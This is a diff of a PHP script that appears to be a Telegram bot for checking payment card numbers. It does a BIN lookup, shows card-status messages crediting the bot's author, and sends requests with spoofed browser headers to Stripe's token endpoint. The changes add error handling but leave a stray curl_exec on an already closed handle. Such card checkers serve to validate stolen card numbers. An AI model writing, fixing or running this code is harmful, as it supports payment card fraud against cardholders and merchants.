@@ -323,18 +323,6 @@ $type =strtoupper(GetStr($fim, '"type":"', '"'));
 //==================[BIN LOOK-UP-END]======================//
 
 
-
-sleep(1);
-    edit_sent_message($chatId, $sent_message_id, "<b>
-
-━━━━━━━━━━━━━━━━━━
-[†] ᴄᴀʀᴅ ★ <code>$lista</code>
-[†] sᴛᴀᴛᴜs ★ ■■■■□ 80%🔴
-[†] ʀᴇsᴘᴏɴsᴇ ★ 81724: Duplicate card exists?
-━━━━━━━━━
-➜ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username/<code>[$rank]</code>
-『 𝗕𝗢𝗧 𝗕𝗬  @hexnynejz 
-━━━━━━━━━━━━━━━━━━</b>");
   # -------------------- [1 REQ] -------------------#
   $ch = curl_init();
 
@@ -364,11 +352,16 @@ $headers[] = 'Sec-Ch-Ua-Mobile: ?0';
 $headers[] = 'Sec-Ch-Ua-Platform: ^^Windows^^\"\"';
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 
-$result = curl_exec($ch);
+$result1 = curl_exec($ch);
+if (curl_errno($ch)) {
+    echo 'Error:' . curl_error($ch);
+}
+curl_close($ch);
 
 
 
-    $ch = curl_init();
+
+   $ch = curl_init();
 
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -393,6 +386,12 @@ $headers[] = 'Sec-Fetch-Mode: cors';
 $headers[] = 'Sec-Fetch-Site: same-site';
 $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0';
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+
+$result2 = curl_exec($ch);
+if (curl_errno($ch)) {
+    echo 'Error:' . curl_error($ch);
+}
+curl_close($ch);
       $result2 = curl_exec($ch);
       $msg2 = Getstr($result2,'"message": "','"');
 
